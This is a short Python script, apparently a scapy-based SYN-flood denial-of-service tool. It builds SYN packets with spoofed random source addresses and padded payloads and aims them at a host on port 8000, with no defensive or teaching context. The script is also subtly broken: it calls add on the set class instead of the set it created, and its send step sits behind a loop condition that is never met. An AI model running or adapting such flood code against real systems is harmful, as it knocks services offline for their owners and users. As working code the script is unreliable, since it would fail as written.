from scapy.all import *
import random
import socket
import struct

def synflood():
    random_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
    target_ip = "192.168.1.108"
    random_port = random.randint(1000, 60000)
    target_port = 8000

    ip = IP(src=random_ip, dst=target_ip)

    tcp = TCP(sport=random_port, dport=target_port, flags="S")

    raw = Raw(b"X"*1024)

    p = ip/tcp/raw

    return p

floodingset = set()
for i in range(0, 10000):
       flooding = synflood()
       set.add(flooding)
       if i == 10000:
            send(floodingset, verbose = 0)
